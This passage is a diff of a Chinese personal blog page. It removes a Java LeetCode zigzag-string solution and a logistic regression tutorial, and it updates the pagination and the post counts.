class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> leetCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 18:54 2022/11/12</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> * Z 字形变换</span></span><br><span class="line"><span class="comment"> * 将一个给定字符串 s 根据给定的行数 numRows ，以从上往下、从左到右进行 Z 字形排列。</span></span><br><span class="line"><span class="comment"> * 之后，你的输出需要从左往右逐行读取，产生出一个新的字符串</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 比如输入字符串为 &quot;PAYPALISHIRING&quot; 行数为 3 时;</span></span><br><span class="line"><span class="comment"> * 输出需要从左往右逐行读取，产生出一个新的字符串为：&quot;PAHNAPLSIIGYIR&quot;。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Aigo_006</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;PAYPALISHIRING&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> convert(str, <span class="number">3</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">convert</span><span class="params">(String str, <span class="type">int</span> numRows)</span> &#123;</span><br><span class="line">        <span class="comment">// 单个字符情况</span></span><br><span class="line">        <span class="keyword">if</span> (numRows &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 存放行结果</span></span><br><span class="line">        List&lt;StringBuilder&gt; rows = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成指定行数 stringbuilder</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">            rows.add(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 行数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 首位变换标识</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">flag</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历字符串</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : str.toCharArray()) &#123;</span><br><span class="line">            <span class="comment">// 向目标行添加字符</span></span><br><span class="line">            rows.get(i).append(c);</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || i == numRows - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 首尾标志变换</span></span><br><span class="line">                flag = -flag;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 行数变换</span></span><br><span class="line">            i += flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 存储结果</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="comment">// 遍历添加结果</span></span><br><span class="line">        <span class="keyword">for</span> (StringBuilder row : rows) &#123;</span><br><span class="line">            result.append(row);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="五：思路总结"><a href="#五：思路总结" class="headerlink" title="五：思路总结"></a>五：思路总结</h2><ul>
-<li>将 Z 形变换的结果，存储到一个父 StringBuilder 中。通过下标，控制向子 StringBuilder 中添加字符，即添加到对应的行中。</li>
-<li>通过 flag 变量，来控制遍历字符串时，对子 StringBuilder 的选择。</li>
-<li>遍历父 StringBuilder ，获取最终的输出结果。</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/" class="post-title-link" itemprop="url">AI_逻辑回归（2）</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-12 14:08:50 / 修改时间：17:08:16" itemprop="dateCreated datePublished" datetime="2022-11-12T14:08:50+08:00">2022-11-12</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/" itemprop="url" rel="index"><span itemprop="name">人工智能</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="逻辑回归"><a href="#逻辑回归" class="headerlink" title="逻辑回归"></a>逻辑回归</h1><h2 id="一：复杂的分类问题"><a href="#一：复杂的分类问题" class="headerlink" title="一：复杂的分类问题"></a>一：复杂的分类问题</h2><h3 id="1-直线决策边界"><a href="#1-直线决策边界" class="headerlink" title="1. 直线决策边界"></a>1. 直线决策边界</h3><p>通过 x<sub>1</sub> 和 x<sub>2</sub> 去判断 y的值</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112141044914.png" style="zoom: 33%;">
-
-<p>概念分布函数</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112141306835.png" style="zoom: 50%;">
-
-<p>核心问题：找到 g(x)，即蓝色的直线；</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112141349124.png" style="zoom:50%;">
-
-<p>决策边界：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112141504765.png" style="zoom:50%;">
-
-<h3 id="2-圆形决策边界"><a href="#2-圆形决策边界" class="headerlink" title="2. 圆形决策边界"></a>2. 圆形决策边界</h3><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112141701950.png" style="zoom: 33%;">
-
-<p>获取概念分布，逻辑回归方程：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112141808332.png" style="zoom: 50%;">
-
-<p>圆形的 g(x) 与直线的 g(x) 不同，新增了2此项。由此获取一个曲线或者圆形。</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112142014947.png" style="zoom: 50%;">
-
-<p>决策边界：</p>
-<p><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112142059035.png"></p>
-<h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h3><ul>
-<li>当使用逻辑回归去求解问题时，核心即找到决策边界。</li>
-<li>逻辑回归结合多项式的边界函数，可以解决复杂的分类问题。<ul>
-<li>线性边界，即多项式为1次；</li>
-<li>圆形边界，即多项式为2次；</li>
-</ul>
-</li>
-</ul>
-<h2 id="二：逻辑回归问题求解"><a href="#二：逻辑回归问题求解" class="headerlink" title="二：逻辑回归问题求解"></a>二：逻辑回归问题求解</h2><ul>
-<li>概念分布函数</li>
-<li>对应的边界函数关系</li>
-</ul>
-<h3 id="1-寻找类别边界"><a href="#1-寻找类别边界" class="headerlink" title="1. 寻找类别边界"></a>1. 寻找类别边界</h3><p>根据训练样本，寻找类别边界；</p>
-<p>即：根据训练样本，寻找找 θ<sub>0</sub>、θ<sub>1</sub>、θ<sub>2</sub></p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112142629280.png" style="zoom:50%;">
-
-<h3 id="2-如何求解系数"><a href="#2-如何求解系数" class="headerlink" title="2.  如何求解系数"></a>2.  如何求解系数</h3><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112142953201.png" style="zoom:50%;">
-
-<p>分类问题，标签与预测结果都是离散的点，使用该损失函数无法寻找到极小值点。</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112143359941.png" style="zoom: 50%;">
-
-<p>图像：</p>
-<p><img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/20200407084418389.png"></p>
-<p>等效转换关系式：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112144946188.png" style="zoom: 50%;">
-
-<p>带入P(x)，求解</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112145047414.png" style="zoom:50%;">
-
-<p>采用梯度下降法，获取最小化的损失函数 J</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112145205900.png" style="zoom:50%;">
-
-<h2 id="三：命名问题"><a href="#三：命名问题" class="headerlink" title="三：命名问题"></a>三：命名问题</h2><p>逻辑回归的主要场景是分类问题，称其为逻辑回归是否合适，为什么？</p>
-<p>逻辑回归虽然名字中有回归，但实际上它是一个<code>二分类算法</code>。</p>
-<p>逻辑回归实际上就是在多元线性回归（θᵀx）的基础上，多嵌套了一个函数，这个函数就是 sigmoid 函数，也被称为 S 型曲线。 </p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112153624030.png" style="zoom: 67%;">
-
-<p>简化表达：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112153714798.png" style="zoom:67%;">
-
-<p>函数图像：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112162347188.png" style="zoom:50%;">
-
-<p style="text-indent:2em">由 sigmoid 函数图像看知，其值域为(0,1)。因此逻辑回归就是在多元线性回归的基础上，讲结果缩放到了0 和 1 之间。</p>
-
-<p style="text-indent:2em">当我们通过线性函数得到一个结果，这个结果越小于0，函数输出就越接近0；结果越大于0，函数输出就越接近1，而分类算法的输出一般情况下都会是 input 属于某个类别的概念大小，因此用0到1之间的范围刚好可以表示概念。中间的0.5则将结果划分为两个类别。所以，我们可以简单的将 sigmoid 函数理解成一个将输出转化为属于某个类别的概念的函数。</p>
-
-<p style="text-indent:2em">综上所述，逻辑回归的大体思想就是，多元线性回归算法回归出一个分类超平面，预测样本通过代入这个超平面，如果是负就说明在这个超平面的下方，如果是正就说明是在这个超平面的上方。再通过 sigmoid 转换为概率，最好通过概率输出类别。</p>
-
-<h2 id="四：逻辑回归统计学模型：伯努利分布"><a href="#四：逻辑回归统计学模型：伯努利分布" class="headerlink" title="四：逻辑回归统计学模型：伯努利分布"></a>四：逻辑回归统计学模型：伯努利分布</h2><p style="text-indent:2em">我们知道，对于二分类算法，样本只有两个标签，要么是0要么是1，并且二分类有一个特点，那就是我们最终预测样本的概念，正例加上负例的概念总和是1。即每一次预测我们都可以这样表示：</p>
-
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112164826386.png" style="zoom:50%;">
-
-<p>这个公式不就是伯努利分布（0-1分布）嘛！</p>
-<p>因此，对于模型每一次预测的输出，我们都可以写成伯努利分布的形式：</p>
-<img src="/2022/11/12/AI-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%EF%BC%882%EF%BC%89/image-20221112164938371.png" style="zoom:50%;">
-
-<p>细微差异：</p>
-<p>伯努利分布中，最经典的案例就是抛硬币。只不过在抛硬币前我们已经假设概率是对半分的。</p>
-<p>但是在逻辑回归中，概念是需要通过每一次模型预测给出的。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1309,7 +1306,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-count">62</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1376,7 +1373,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">本博客全站共40.5k字</span>
+  <span class="post-count">本博客全站共43.6k字</span>
 </div>
 
 
